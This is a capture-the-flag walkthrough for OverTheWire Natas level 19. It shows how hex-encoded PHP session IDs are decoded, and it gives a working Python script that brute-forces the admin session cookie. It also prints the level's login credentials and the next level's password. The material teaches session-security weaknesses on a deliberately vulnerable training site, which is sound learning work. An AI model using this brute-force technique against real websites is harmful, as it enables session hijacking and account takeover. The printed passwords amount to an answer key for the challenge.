# Natas Level 19 → 20

## Goal

Identical vulnerability to level 18 — session IDs still in a small, guessable range — but now the session IDs are **hex-encoded**. Log in as any user, look at your PHPSESSID, understand the pattern, then brute-force the admin cookie.

## Concepts you'll learn

- Reverse-engineering a cookie encoding by inspecting the output of a few logins
- That "adding some encoding" is not adding any security
- Using multiple logins with known usernames to pin down the session-ID scheme

## Walkthrough

### 1. Observe the cookie

Log in once with username `a` (password: anything — the source accepts anything non-empty). Inspect your `PHPSESSID`:

```
3536312d61
```

Decode as hex:

```bash
$ python3 -c "print(bytes.fromhex('3536312d61').decode())"
561-a
```

So the scheme is `<number>-<username>`, then hex-encoded. Try another username:

```
Login username=b → cookie 3339382d62 → "398-b"
Login username=c → cookie 3535372d63 → "557-c"
```

The number before the dash is the session counter — still in the range `1..640` as in level 18.

### 2. Brute-force admin sessions

For each `i` from 1 to 640, construct `i-admin`, hex-encode it, send as `PHPSESSID`:

```python
import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas19.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

for i in range(1, 641):
    sid = f"{i}-admin".encode().hex()
    r = requests.get(URL, auth=AUTH, cookies={"PHPSESSID": sid},
                     params={"username": "admin", "password": "x"})
    if "password for natas20" in r.text:
        print(f"hit at i={i}")
        print(r.text)
        break
```

Minute or two later, you land on the admin session and the response includes:

```
eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```

## The answer

The password for `natas20` is:

**`eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas19.natas.labs.overthewire.org/>
